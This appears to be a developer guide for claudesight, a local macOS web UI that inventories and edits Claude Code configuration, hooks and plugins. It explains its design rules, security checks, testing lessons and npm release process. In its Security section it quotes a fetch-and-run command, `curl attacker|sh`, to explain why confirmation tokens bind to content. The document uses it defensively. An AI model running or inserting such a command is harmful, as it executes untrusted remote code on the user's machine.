# claudesight

A local web UI that resolves every Claude Code artifact on the machine and lets you edit
the ones that are safe to edit. Node 20+ / ESM, Vite + React + CSS modules, Vitest.

**macOS only, on purpose.** `bin/claudesight.js` refuses to start on any other platform.
There was Linux code here — an XDG trash implementation — that had never run outside the
test suite, and untested branches presented as platform support are the same class of
claim as a bare zero. It survives as the `folder` mechanism in `trash.js`, named for what
it does, used by tests so deleting does not litter the real Trash, and the obvious
starting point if Linux support is ever added. If you add a platform, add CI for it in
the same change.

The spec at `docs/superpowers/specs/2026-09-11-claudesight-design.md` is the authority on
behaviour. When code and spec disagree, one of them is a bug — decide which and fix it,
then record the decision in the spec's revision history.

## The one invariant

**A reader never reports a bare zero.** `src/server/result.js` is a five-state discriminated
union — `ok`, `empty`, `absent`, `denied`, `malformed` — and those states must stay
distinguishable all the way to the screen. "There is nothing here" and "I could not look"
are different answers, and collapsing them is the failure this whole app exists to prevent.

Two corollaries, both learned from shipped bugs:

- **An indicator must not promise more than the page shows.** A project marker claiming
  `.claude` while the panel renders empty is the same lie in a different costume. After
  touching any reader, re-run the marker-vs-inventory audit across every discovered project.
- **Anything a reader does not recognise still gets listed.** A project's `.claude/` is
  curated by hand, so an unknown entry is something the user put there deliberately; it
  appears under `other` as "no reader for this yet". The global root is deliberately
  excluded — it holds Claude Code's own caches and daemon state, which is noise.

## Things that look wrong but are correct

**Writability is computed from where a file lives, not who wrote it.** `writability.js`
classifies by path. A plugin you wrote yourself is still read-only if it sits in
`plugins/cache/`, because `claude plugin update` overwrites that directory. Users ask about
this; the answer is the mechanism, not the authorship.

**Plugin artifacts load from the plugin root only** —
`plugins/cache/<marketplace>/<plugin>/<version>/<kind>`. Walking the cache for any directory
named `agents/` also finds skills that keep their own prompt files nested, which over-reports.
The count must agree with what `/context` says Claude Code loaded.

**Vendored copies are excluded.** Plugin repos ship `.cursor/`, `.codex-plugin/`, `.agents/`
and friends. Claude Code never loads those; counting them double-reports one artifact under
two paths. `visibleUnder()` in `readers/shared.js` filters any hidden path segment.

**A GitHub repo is a marketplace.** There is no separate marketplace product. A plugin
installed from a personal repo is as much a plugin as an official one.

**Project discovery never scans the filesystem.** It unions the project registry,
`history.jsonl`, and transcript `cwd`s. Measured: 0.65s for 11 exact results, against 0.23s
for a scan that returned 12 hits of which 4 were real. Do not add a scan.

**Every diff is computed in the direction of its action.** `add` always means "this
action adds this line", for both the save preview and the version compare; only the verb
differs. The restore diff was once computed backwards and corrected in the view, which
survived exactly until the CSS was updated without the JSX. Never reintroduce a sign flip.

**The Trash path is the only one that runs in production, and was the only one untested.**
Every version test forces the `folder` mechanism so the suite does not litter a real Trash —
which meant the macOS branch shipped broken. `/usr/bin/trash` does not implement a `--`
separator: it treats it as a filename, trashes the real target anyway, and exits 5. Deleting
therefore reported failure on every attempt while having succeeded, leaving a copy in the
Trash and the version still listed. If you touch trash.js, run the darwin tests in
`tests/platform.test.js`, which exercise it for real.

**Every declared hook gets a row, including ones that name no script.** A hook whose
command is inline (`npx prettier --write`), a hooks block that is not a list, a matcher
whose `hooks` is not a list, a hook entry with no command — all four were silently dropped,
so a hook Claude Code runs on every matching tool call was absent from the page that exists
to list what is configured. Rows with no script of their own take the path of the
settings file that declares them, carry `ownScript: false` so nothing labels them
executable, and an inline hook is NOT broken: it runs.

**A hook's capabilities are a conditional claim and must stay one.** `capabilitiesOf` in
readers/settings.js scans a script body for the protocol keys that auto-approve, rewrite
the command, or hard-block. It says "can auto-approve", never "auto-approved" — a body
that builds its JSON dynamically or shells out to a binary is invisible to a text scan, so
an empty list means "nothing found by reading". The fixed "Not checked" line under the
scripts group exists for the same reason: nothing here is executed, and a clean list must
never read as a clean bill of health.

**Version ids must stay sortable.** They were `<ISO timestamp>-<random hex>` and the list
is sorted by id as a string, so two snapshots inside one millisecond ordered at random —
which made "newest first" wrong and `listVersions()[0]` an unreliable answer to "what did
I save last". A zero-padded counter fixed it. It surfaced as a flaky test, not a report.

**Deletion moves to the Trash.** `trash.js` refuses rather than unlinking when it cannot
identify a trash mechanism. Never add an `fs.unlink` fallback.

## Security

`security.js` carries the whole defence in three checks: `Origin`, `Host`, and
`application/json` on writes. A page on any site can send requests to `127.0.0.1` — localhost
is not a boundary against the user's own browser — and those three refuse them.

**Do not reintroduce a secret in the URL.** Revisions 2–4 had one (a token, then a single-use
nonce exchanged for a cookie). It defended only against non-browser local clients, which can
read and write `~/.claude` directly and never needed the API, while making the launch link
one-shot — whoever opened it first claimed the server. It was removed deliberately.

Writes that install an executable command require an HMAC confirmation token bound to
**both** the target and the content. Binding to the target alone allows approving `echo hi`
and installing `curl attacker|sh`. `execgate.js` diffs the **union** of keys before and
after: an after-only diff hides deletions, and a string-only shape check misses booleans
that disable guards.

## Working on this

**Tests must fail against reverted code.** The repeated failure mode here was a correct fix
guarded by a vacuous test — a fixture that did not discriminate, or an assertion that passed
either way. Before claiming a fix is guarded, revert the production change and watch the test
go red.

**The UI is mounted in tests now, but only partly.** `tests/inventory-render.test.jsx`
runs under jsdom with @testing-library/react and asserts the five states reach the screen
as five different sentences — the one invariant, checked where it actually matters. Every
other UI test still reads JSX as text and would pass if the component stopped rendering.
Treat a green suite as covering Inventory's states and nothing else in the UI.

**Render it in a browser.** Several defects reached "all tests pass" and were caught only by
looking: a plugin row that hung on `EISDIR`, a theme transition that left the page painted in
the previous palette, a project panel drawn below the fold so clicking appeared to do nothing.

**The pattern behind most of the bugs found here.** Every defect worth fixing so far has
had one shape: the app already held a fact and dropped it on the last step to the screen.
A missing hook script, a dirty editor buffer, the denied paths behind a count, a malformed
settings file that vanished entirely, the parse position, the drift versions, the selected
project. When looking for what to improve, look for what is computed and not surfaced
before looking for what needs computing.

**Measure instead of asserting.** Claims about this codebase that turned out false include
"session files carry a tail summary" (1 in 20 do) and "therefore we need an index" (a full
113 MB parse takes 0.75s).

**Never fabricate a value where the truth is unknown.** `positionOf` in fsread.js used
to return line 1, column 1 whenever V8 declined to report a position — which it does for
most multi-line JSON errors. A confident wrong answer that sends the reader to the top of
the file is worse than `null` and a sentence saying the parser did not say.

**A free identifier can be a browser global.** Deleting local `open` state left
``${open ? s.split : ''}`` resolving to `window.open` — always truthy, no lint error, no
build error, no console error. The layout was simply wrong forever. When you remove a
variable, grep for its bare name, not just its declaration.

**A devDependency bump does not publish.** `shipsChanged` compares the package.json at
the last tag against the current one rather than treating any package.json change as
shipping. Runtime dependencies, `bin`, `files`, `engines` and friends ship; the linter and
the test runner do not. Note what is deliberately NOT exempt: vite and its react plugin
are devDependencies that BUILD `dist/`, so bumping them genuinely changes what users
receive. An unrecognised dependency is assumed to ship — publishing a no-op version is
cheaper than withholding a real fix. A lockfile that moves without package.json is a
transitive bump and also assumed to ship.

**A push to main publishes to npm.** There is no separate release step and no manual
version bump. `scripts/release-version.js` derives the version from commit subjects since
the last `v*` tag; the `release` job in `ci.yml` commits it back, tags, publishes with
provenance and opens a GitHub release. Three consequences worth holding in mind: a commit
touching `bin/`, `src/`, `package.json`, the lockfile or `vite.config.js` ships to users
within minutes; a published version can never be changed, only superseded; and the
`audit` job blocks releases, so a high advisory in a dev dependency stops shipping
entirely. The lockfile counts as shipping because React is compiled into the UI bundle.

**npm trusts the workflow FILENAME. Do not rename `ci.yml`.** Publishing uses OIDC
trusted publishing, not a token: npm holds a fixed record of the repository, the workflow
filename `ci.yml` and the environment `release`, and grants a short-lived credential to a
run matching all three. npm freezes those fields at creation — they cannot be edited. So
renaming the workflow, renaming the environment, or splitting the release job into its own
file silently breaks publishing, and the fix is to delete the trusted publisher on npmjs.com
and create a new one. There is no `NPM_TOKEN` to fall back on.

**Build before serving.** `bin/claudesight.js` serves `dist/`. Source edits are invisible
until `npm run build`.

## Not built yet

No search, sort or filter anywhere. No keyboard navigation beyond Escape. No sessions
view, though transcripts are already parsed for project discovery. No token-cost
accounting — and note that the app could only ever estimate it by measuring text, since
the real figures come from Claude Code itself; an estimate presented as authoritative
would be a new way of lying. Agent and command *creation* (only skills can be created).
Managed-policy source display. No multi-machine anything.

Partly done: the declared-vs-used join. A hook or statusline script that is declared but
missing or unreadable is surfaced as broken at both scopes. Still unjoined: agent and
command declarations naming an uninstalled plugin, settings keys silently shadowed by a
stricter managed-scope value, and MCP servers whose `command` is not on PATH — the same
shape as the broken-hook case, applied to `.mcp.json`.

## How the backlog has been chosen

Four tournaments of competing agents, judged on a fixed rubric. What they were good at
was reading the code and naming where a fact gets dropped; what they consistently got
wrong was the size of the problem — three times the winning idea named a real defect and
checking it against a running program found something worse a line away. Treat their
output as a map of where to look, never as a verdict. Verify every claim, including the
citations: one proposal specified `.ts` files for a repo that has none.
